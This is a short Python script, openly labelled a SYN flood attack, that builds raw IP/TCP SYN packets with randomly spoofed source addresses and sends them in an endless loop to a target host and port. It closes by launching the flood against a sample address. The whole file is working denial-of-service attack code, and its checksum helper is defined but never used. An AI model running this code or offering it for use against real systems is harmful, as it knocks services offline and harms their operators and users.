import socket
import random
import struct

def checksum(msg):
    """Compute checksum for IP/TCP headers."""
    s = 0
    for i in range(0, len(msg), 2):
        w = msg[i] + (msg[i+1] << 8) if i+1 < len(msg) else msg[i]
        s = s + w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

def syn_flood(target_ip, target_port):
    """Perform a SYN flood attack on the target IP and port."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    
    while True:
        src_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
        src_port = random.randint(1024, 65535)

        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            69, 0, 40, 54321, 0, 64, socket.IPPROTO_TCP, 0,
            socket.inet_aton(src_ip),
            socket.inet_aton(target_ip)
        )

        tcp_header = struct.pack(
            "!HHLLBBHHH",
            src_port, target_port, 0, 0, 80, 2, 0, 0, 0
        )

        packet = ip_header + tcp_header
        sock.sendto(packet, (target_ip, target_port))
        print(f"Sent SYN packet from {src_ip}:{src_port} to {target_ip}:{target_port}")

# Example usage
TARGET_IP = "192.168.1.100"
TARGET_PORT = 80

syn_flood(TARGET_IP, TARGET_PORT)
